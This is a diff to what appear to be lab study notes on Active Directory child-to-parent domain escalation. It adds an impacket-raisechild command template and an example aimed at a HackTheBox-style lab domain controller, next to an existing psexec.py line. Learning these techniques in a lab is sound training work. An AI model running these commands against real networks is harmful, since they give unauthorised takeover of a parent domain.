@@ -90,4 +90,9 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 
 Automated Tooling:
 
-Thanks 
+Thanks to impacket, we actually have an automated tool to archive such by using impacket-raisechild, all we need is a child domain account and the dcip for the parent domain:
+```
+impacket-raisechild -target-exec <dcip> <childdomainfqdn>/<username>
+#Example:
+impacket-raisechild -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+```
